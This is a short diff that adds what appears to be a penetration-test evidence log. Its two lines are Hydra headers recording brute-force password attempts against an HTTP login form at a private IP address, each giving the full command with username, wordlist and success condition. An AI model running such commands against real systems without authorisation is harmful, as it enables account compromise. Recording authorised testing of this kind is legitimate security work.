@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2025-09-10 15:56:10 on 192.168.100.101 http-post-form (hydra -I -V -f -l wangxx -P wordlists/windows_passwords.txt -t 1 -w 2 -o evidence/html_success_detection.txt 192.168.100.101 http-post-form /dologin.html:httpd_username=^USER^&httpd_password=^PASS^:login.html:C=Logout)
+# Hydra v9.5 run at 2025-09-10 15:57:48 on 192.168.100.101 http-post-form (hydra -I -V -f -l wangxx -P /dev/fd/63 -t 1 -w 5 -o evidence/html_success_detection.txt 192.168.100.101 http-post-form /dologin.html:httpd_username=^USER^&httpd_password=^PASS^:S=Logout)
